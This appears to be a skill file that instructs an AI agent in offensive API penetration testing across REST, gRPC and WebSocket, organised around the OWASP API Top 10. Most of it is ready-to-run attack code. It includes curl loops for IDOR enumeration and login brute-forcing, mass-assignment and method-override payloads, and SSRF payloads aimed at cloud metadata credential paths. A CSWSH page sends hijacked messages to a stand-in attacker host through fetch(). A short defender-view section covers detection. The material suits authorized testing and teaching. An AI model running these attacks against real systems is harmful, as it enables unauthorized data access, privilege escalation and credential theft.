---
name: offensive-api-security
description: "Comprehensive API security testing methodology covering REST, gRPC, and WebSocket attack surfaces. Addresses the full OWASP API Security Top 10 2023 including BOLA/IDOR, broken authentication, excessive data exposure, rate limiting bypass, BFLA, mass assignment, SSRF, and security misconfiguration. Includes REST-specific attacks such as HTTP verb tampering, content-type switching, and parameter pollution. Covers gRPC exploitation through protobuf interception, reflection API enumeration, and metadata injection. Addresses WebSocket vulnerabilities including origin bypass, message injection, and cross-site WebSocket hijacking. Provides tooling guidance for Burp Suite, Postman, grpcurl, websocat, and mitmproxy. Each technique includes detection signatures and defensive indicators so you understand what artifacts your testing leaves behind. Designed for authorized penetration testing engagements against API-driven architectures."
---

# Offensive API Security Testing

You are conducting authorized security assessments against API-driven applications. This skill covers REST, gRPC, and WebSocket attack surfaces with emphasis on the OWASP API Security Top 10 2023. Every technique assumes you have written authorization and a defined scope. Your goal is to identify vulnerabilities that allow unauthorized data access, privilege escalation, or service disruption through API-layer attacks.

## Quick Workflow

1. Map the API surface: collect OpenAPI/Swagger specs, gRPC reflection output, and WebSocket endpoints.
2. Enumerate authentication mechanisms: API keys, OAuth flows, JWTs, session tokens.
3. Test BOLA/IDOR by substituting object identifiers across authenticated contexts.
4. Probe authorization boundaries with BFLA checks across roles and HTTP methods.
5. Fuzz parameters for mass assignment, content-type switching, and verb tampering.
6. Assess rate limiting and resource consumption controls.
7. Test gRPC-specific vectors: reflection enumeration, metadata injection, protobuf manipulation.
8. Evaluate WebSocket security: origin validation, message integrity, CSWSH.
9. Check for SSRF via URL-accepting parameters and webhook configurations.
10. Document findings with reproduction steps and severity ratings.

---

## OWASP API Top 10 2023 -- BOLA and IDOR

Broken Object Level Authorization (BOLA) is the most prevalent API vulnerability. You test it by capturing a legitimate request containing an object identifier and replaying it with identifiers belonging to other users or tenants.

```http
GET /api/v1/users/1001/orders HTTP/1.1
Authorization: Bearer eyJhbGciOi...user_a_token
Host: target.example.com
```

Replay with a different user ID while retaining the original token:

```http
GET /api/v1/users/1002/orders HTTP/1.1
Authorization: Bearer eyJhbGciOi...user_a_token
Host: target.example.com
```

Automate IDOR testing across sequential and UUID-based identifiers:

```bash
# Sequential ID enumeration
for id in $(seq 1000 1050); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "https://target.example.com/api/v1/users/${id}/orders")
  echo "ID: ${id} -> HTTP ${status}"
done
```

```bash
# Test with collected UUIDs from other endpoints
while read -r uuid; do
  resp=$(curl -s -H "Authorization: Bearer $TOKEN_A" \
    "https://target.example.com/api/v1/documents/${uuid}")
  echo "UUID: ${uuid} -> $(echo "$resp" | jq -r '.owner // "no_owner_field"')"
done < collected_uuids.txt
```

Test across HTTP methods -- an endpoint may enforce authorization on GET but not on PUT or DELETE:

```bash
for method in GET PUT PATCH DELETE; do
  curl -s -o /dev/null -w "${method} -> %{http_code}\n" \
    -X "${method}" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d '{"status":"cancelled"}' \
    "https://target.example.com/api/v1/users/1002/orders/5001"
done
```

---

## Broken Authentication and Excessive Data Exposure

Test authentication endpoints for credential stuffing resilience, token lifecycle weaknesses, and information leakage in API responses.

```bash
# Rapid credential testing -- probe for missing rate limits on login
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"email\":\"test@example.com\",\"password\":\"attempt${i}\"}" \
    "https://target.example.com/api/v1/auth/login")
  echo "Attempt ${i}: HTTP ${code}"
  [ "$code" = "429" ] && echo "Rate limit hit at attempt ${i}" && break
done
```

Check for excessive data exposure by comparing full API responses against what the UI renders. Look for internal IDs, other users' emails, hashed passwords, role assignments, or PII the client never displays:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users/me" | jq .
```

Test token validation weaknesses:

```bash
# Expired token, post-password-change token, malformed bearer values
curl -s -o /dev/null -w "Expired: %{http_code}\n" \
  -H "Authorization: Bearer $EXPIRED_TOKEN" \
  "https://target.example.com/api/v1/users/me"

curl -s -o /dev/null -w "Pre-change: %{http_code}\n" \
  -H "Authorization: Bearer $PRE_PASSWORD_CHANGE_TOKEN" \
  "https://target.example.com/api/v1/users/me"

for val in "" "null" "undefined" "Bearer" "Bearer "; do
  curl -s -o /dev/null -w "Value '${val}' -> %{http_code}\n" \
    -H "Authorization: ${val}" \
    "https://target.example.com/api/v1/users/me"
done
```

---

## Rate Limiting and Resource Consumption

Test for Unrestricted Resource Consumption (API4:2023) by assessing whether the API enforces limits on request frequency, payload size, and response pagination.

```bash
# Measure rate limit headers across rapid requests
for i in $(seq 1 50); do
  curl -s -D - -o /dev/null \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/v1/search?q=test" 2>&1 | \
    grep -iE "x-rate|retry-after|x-ratelimit"
  sleep 0.1
done
```

```bash
# Pagination abuse and large payload submission
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/products?page=1&per_page=100000" | jq 'length'

python3 -c "
import json, sys
payload = {'name': 'A' * 1000000, 'tags': ['x'] * 10000}
sys.stdout.write(json.dumps(payload))
" | curl -s -o /dev/null -w "Large payload: %{http_code}\n" \
  -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d @- \
  "https://target.example.com/api/v1/products"
```

---

## BFLA and Mass Assignment

Broken Function Level Authorization (BFLA) occurs when low-privilege users can invoke administrative API functions. Mass assignment exploits occur when the API binds client-supplied data directly to internal object properties.

```bash
# BFLA: Test admin endpoints with regular user token
admin_endpoints=(
  "GET /api/v1/admin/users"
  "POST /api/v1/admin/users"
  "DELETE /api/v1/admin/users/1001"
  "GET /api/v1/admin/config"
  "PUT /api/v1/admin/config"
  "GET /api/v1/internal/metrics"
)

for ep in "${admin_endpoints[@]}"; do
  method=$(echo "$ep" | cut -d' ' -f1)
  path=$(echo "$ep" | cut -d' ' -f2)
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    "https://target.example.com${path}")
  echo "${method} ${path} -> HTTP ${code}"
done
```

```bash
# Mass assignment: inject properties that should not be user-controllable
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Updated Name",
    "role": "admin",
    "is_admin": true,
    "permissions": ["admin", "superuser"],
    "account_type": "premium",
    "credit_balance": 99999
  }' \
  "https://target.example.com/api/v1/users/me" | jq .
```

---

## REST Verb Tampering and Content-Type Switching

APIs sometimes apply security controls only to expected HTTP methods or content types. You exploit this by sending requests with unexpected methods or by switching the serialization format.

```bash
# Verb tampering: test all methods against a restricted endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/v1/admin/settings")
  echo "${method} -> HTTP ${code}"
done
```

```bash
# Method override headers -- bypass method-based WAF rules
curl -s -X POST \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users/1002"

curl -s -X POST \
  -H "X-Method-Override: PUT" -H "X-HTTP-Method: PATCH" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "https://target.example.com/api/v1/users/me"
```

```bash
# Content-type switching and parameter pollution
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test&role=admin" \
  "https://target.example.com/api/v1/users"

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><name>test</name><role>admin</role></user>' \
  "https://target.example.com/api/v1/users"

# Parameter pollution via duplicate keys
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/transfer?to=attacker&amount=100&to=victim"
```

---

## SSRF via API Parameters

Server-Side Request Forgery through URL-accepting API parameters allows you to reach internal services or cloud metadata endpoints.

```bash
ssrf_payloads=(
  "http://169.254.169.254/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://127.0.0.1:8080/admin"
  "http://[::1]:8080/"
  "http://0x7f000001/"
  "http://internal-service.local/"
)

for payload in "${ssrf_payloads[@]}"; do
  echo "--- Testing: ${payload}"
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"webhook_url\": \"${payload}\"}" \
    "https://target.example.com/api/v1/integrations/webhook" | head -c 500
  echo
done
```

Test SSRF through import/export and profile features:

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"import_url": "http://169.254.169.254/latest/user-data"}' \
  "https://target.example.com/api/v1/data/import"

curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  "https://target.example.com/api/v1/users/me/profile"
```

---

## gRPC Security Testing

gRPC services expose a different attack surface than REST. You use reflection to enumerate services, grpcurl to craft requests, and mitmproxy to intercept protobuf traffic.

```bash
# Enumerate services via gRPC reflection
grpcurl -plaintext target.example.com:50051 list
grpcurl -plaintext target.example.com:50051 describe myapp.UserService
grpcurl -plaintext target.example.com:50051 describe myapp.UserService.GetUser
```

```bash
# Test BOLA on gRPC -- access another user's data with your token
grpcurl -plaintext \
  -H "authorization: Bearer $TOKEN_A" \
  -d '{"user_id": "1002"}' \
  target.example.com:50051 myapp.UserService/GetUser

# Test admin methods with regular user credentials
grpcurl -plaintext \
  -H "authorization: Bearer $REGULAR_TOKEN" \
  -d '{}' \
  target.example.com:50051 myapp.AdminService/ListAllUsers
```

Metadata injection -- gRPC metadata headers can be exploited similarly to HTTP headers:

```bash
grpcurl -plaintext \
  -H "authorization: Bearer $TOKEN" \
  -H "x-forwarded-for: 127.0.0.1" \
  -H "x-internal-service: true" \
  -H "x-user-role: admin" \
  -d '{}' \
  target.example.com:50051 myapp.AdminService/GetConfig
```

Intercept and modify gRPC traffic with mitmproxy:

```python
# mitmproxy addon for gRPC inspection (save as grpc_inspector.py)
# Run: mitmproxy -s grpc_inspector.py --mode reverse:https://target:50051
from mitmproxy import http

class GrpcInspector:
    def request(self, flow: http.HTTPFlow):
        if flow.request.headers.get("content-type", "").startswith("application/grpc"):
            print(f"[gRPC] {flow.request.method} {flow.request.path}")
            for k, v in flow.request.headers.items():
                if not k.startswith(":"):
                    print(f"  Metadata: {k}: {v}")

    def response(self, flow: http.HTTPFlow):
        if flow.response and "grpc-status" in flow.response.headers:
            print(f"[gRPC Response] Status: {flow.response.headers['grpc-status']}")

addons = [GrpcInspector()]
```

---

## WebSocket Security Testing

WebSocket connections bypass many traditional HTTP security controls. You test origin validation, message injection, authentication persistence, and cross-site WebSocket hijacking.

```bash
# Origin validation testing with websocat
websocat -H "Origin: https://evil.example.com" "wss://target.example.com/ws/chat"
websocat "wss://target.example.com/ws/chat"  # no origin
websocat -H "Origin: https://subdomain.target.example.com" "wss://target.example.com/ws/chat"
```

```python
#!/usr/bin/env python3
"""WebSocket message fuzzing and injection testing."""
import asyncio, websockets, json

async def test_ws_injection(url, token):
    headers = {"Cookie": f"session={token}"}
    async with websockets.connect(url, extra_headers=headers) as ws:
        test_payloads = [
            json.dumps({"type": "message", "content": "hello"}),
            json.dumps({"type": "message", "content": "hello", "user_id": "1002"}),
            json.dumps({"type": "admin_broadcast", "content": "injected"}),
            json.dumps({"type": "subscribe", "channel": "../admin/notifications"}),
            json.dumps({"type": "message", "content": "A" * 1000000}),
        ]
        for payload in test_payloads:
            await ws.send(payload)
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f"Sent: {payload[:80]}\nRecv: {response[:200]}\n---")
            except asyncio.TimeoutError:
                print(f"Sent: {payload[:80]} -> No response\n---")

asyncio.run(test_ws_injection("wss://target.example.com/ws/chat", "SESSION_TOKEN"))
```

Cross-Site WebSocket Hijacking (CSWSH) verification:

```html
<!-- Host on attacker-controlled domain -- authorized testing only -->
<script>
  var ws = new WebSocket("wss://target.example.com/ws/chat");
  ws.onopen = function() {
    console.log("[CSWSH] Connection opened -- origin validation missing");
    ws.send(JSON.stringify({type: "message", content: "cswsh-test"}));
  };
  ws.onmessage = function(evt) {
    console.log("[CSWSH] Received: " + evt.data);
    fetch("https://attacker-log.example.com/log", {method: "POST", body: evt.data});
  };
  ws.onerror = function(e) {
    console.log("[CSWSH] Connection failed -- origin may be validated");
  };
</script>
```

---

## API Versioning and Security Misconfiguration

APIs that maintain multiple versions often have inconsistent security controls. Deprecated versions may lack patches applied to current versions.

```bash
# Enumerate API versions
versions=("v1" "v2" "v3" "v0" "v1-beta" "v2-beta" "internal" "latest" "dev" "staging")
for ver in "${versions[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/${ver}/users/me")
  [ "$code" != "404" ] && echo "Version '${ver}' -> HTTP ${code}"
done
```

```bash
# Check for exposed documentation and debug endpoints
endpoints=(
  "/swagger.json" "/swagger-ui/" "/openapi.json" "/api-docs"
  "/graphql" "/graphiql" "/.well-known/openid-configuration"
  "/actuator" "/actuator/env" "/actuator/health"
  "/debug" "/trace" "/metrics" "/_profiler"
)
for ep in "${endpoints[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.example.com${ep}")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "${ep} -> HTTP ${code}"
done
```

```bash
# CORS misconfiguration testing
curl -s -D - -o /dev/null \
  -H "Origin: https://evil.example.com" -X OPTIONS \
  "https://target.example.com/api/v1/users/me" 2>&1 | \
  grep -iE "access-control|allow-origin|allow-credentials"

curl -s -D - -o /dev/null -H "Origin: null" \
  "https://target.example.com/api/v1/users/me" 2>&1 | grep -i "access-control"

# Security header audit
curl -s -D - -o /dev/null "https://target.example.com/api/v1/health" 2>&1 | \
  grep -iE "x-content-type|x-frame|strict-transport|content-security|x-powered-by|server:"
```

---

## Detection / Defender View

When you run these tests, you leave artifacts that defenders and monitoring systems detect:

- **BOLA/IDOR probes** generate sequences of requests with incrementing or random object IDs from a single session. API gateways log unusual access patterns across object identifiers. Anomaly detection flags accounts accessing resources outside their normal scope.

- **Rate limit testing** produces burst traffic visible in access logs. HTTP 429 responses trigger SIEM alerts. Repeated authentication failures activate account lockout mechanisms.

- **Verb tampering and method override** requests with unusual HTTP methods or override headers stand out in access logs. Security-conscious applications alert on method override header usage.

- **gRPC reflection enumeration** is logged by interceptors. Calls to the reflection service from non-development IPs trigger alerts. Metadata injection attempts appear in gRPC access logs.

- **WebSocket testing** generates connection attempts with unusual Origin headers logged at the load balancer. CSWSH attempts may trigger CSP violation reports.

- **SSRF payloads** containing internal IPs or metadata URLs are flagged by WAFs. Outbound connections to unexpected destinations trigger network monitoring alerts.

- **Version probing** creates 404 bursts across multiple path prefixes from a single source IP.

---

## Engagement Cheatsheet

| Phase | Action | Tool |
|-------|--------|------|
| Reconnaissance | Collect API specs | Burp crawler, Swagger endpoints |
| Reconnaissance | gRPC service enumeration | grpcurl with reflection |
| Reconnaissance | WebSocket endpoint discovery | Burp Suite, DevTools |
| Authentication | Token lifecycle testing | curl, Burp Repeater |
| Authorization | BOLA/IDOR across objects | curl loops, Burp Intruder |
| Authorization | BFLA across roles | curl with multiple tokens |
| Input handling | Mass assignment | curl, Postman |
| Input handling | Content-type switching | curl with varied headers |
| Protocol | gRPC metadata injection | grpcurl |
| Protocol | gRPC protobuf interception | mitmproxy with addon |
| Protocol | WebSocket injection | websocat, Python websockets |
| Protocol | CSWSH verification | Custom HTML test page |
| Infrastructure | SSRF via URL parameters | curl, Burp Collaborator |
| Infrastructure | API versioning bypass | curl version enumeration |
| Infrastructure | Misconfiguration scan | curl, Burp scanner |

---

## Key References

- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- gRPC Security Documentation: https://grpc.io/docs/guides/auth/
- WebSocket Security (RFC 6455 Section 10): https://datatracker.ietf.org/doc/html/rfc6455#section-10
- Burp Suite API Testing: https://portswigger.net/burp/documentation/desktop/testing-workflow/api-testing
- grpcurl: https://github.com/fullstorydev/grpcurl
- websocat: https://github.com/vi/websocat
- mitmproxy: https://docs.mitmproxy.org/
- PortSwigger Academy -- API Testing: https://portswigger.net/web-security/api-testing
- "Hacking APIs" by Corey Ball (No Starch Press)
